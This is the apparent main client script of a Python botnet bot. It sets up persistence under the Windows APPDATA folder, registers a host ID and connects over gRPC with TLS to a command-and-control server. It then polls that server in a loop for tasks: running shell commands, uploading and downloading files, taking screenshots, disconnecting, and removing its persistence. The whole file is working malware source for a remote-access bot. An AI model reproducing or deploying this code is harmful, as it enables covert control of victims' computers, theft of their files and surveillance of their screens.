import grpc
import time
import sys
import os
from protos.botnet_pb2 import *
from protos.botnet_pb2_grpc import *
from bot.modules import connection, cmd, screenshot, files, tareas, persistence

if __name__ == '__main__':

    BOT_TASKS = []
    BOT_COMPLETED_TASKS = []
    HOST_ID = ""
    SLEEP_TIME = 30
    SERVER = ""

    application_path = os.path.dirname(sys.executable)
    appdata = os.environ["appdata"]
    persistence.check_bot(appdata, application_path)
    HOST_ID = persistence.check_id(appdata)
    cert = sys._MEIPASS + "\env.crt"

    while True:
        with open(cert, "rb") as f:
            creds = grpc.ssl_channel_credentials(f.read())
        channel = grpc.secure_channel(SERVER, creds)
        try:
            grpc.channel_ready_future(channel).result(timeout=10)
        except grpc.FutureTimeoutError:
            time.sleep(5)
        else:
            client = BotnetStub(channel)
            connection.set_connection(client, HOST_ID, "CONNECTED")
            while True:
                try:
                    BOT_TASKS = tareas.get_tasks(client, HOST_ID, BOT_TASKS)
                    if BOT_TASKS == []:
                        time.sleep(SLEEP_TIME)
                    else:
                        for i in BOT_TASKS:
                            if i.type == 3:
                                BOT_COMPLETED_TASKS.append(cmd.get_cmd(i))
                            elif i.type == 4:
                                BOT_COMPLETED_TASKS.append(files.upload_file(client, i))
                            elif i.type == 5:
                                BOT_COMPLETED_TASKS.append(files.download_file(client, i))
                            elif i.type == 6:
                                BOT_COMPLETED_TASKS.append(screenshot.screenshot(client, i))
                            elif i.type == 7:
                                connection.set_connection(client, HOST_ID, "DISCONNECTED")
                                BOT_COMPLETED_TASKS.append(connection.disconnect(i))
                                tareas.send_tasks(client, BOT_COMPLETED_TASKS)
                                sys.exit(0)
                            elif i.type == 8:
                                BOT_COMPLETED_TASKS.append(persistence.delete_persistence(appdata, i))
                                tareas.send_tasks(client, BOT_COMPLETED_TASKS)
                                sys.exit(0)
                            BOT_TASKS.remove(i)
                        if BOT_COMPLETED_TASKS != []:
                            tareas.send_tasks(client, BOT_COMPLETED_TASKS)
                            BOT_COMPLETED_TASKS = []
                except grpc.RpcError:
                    break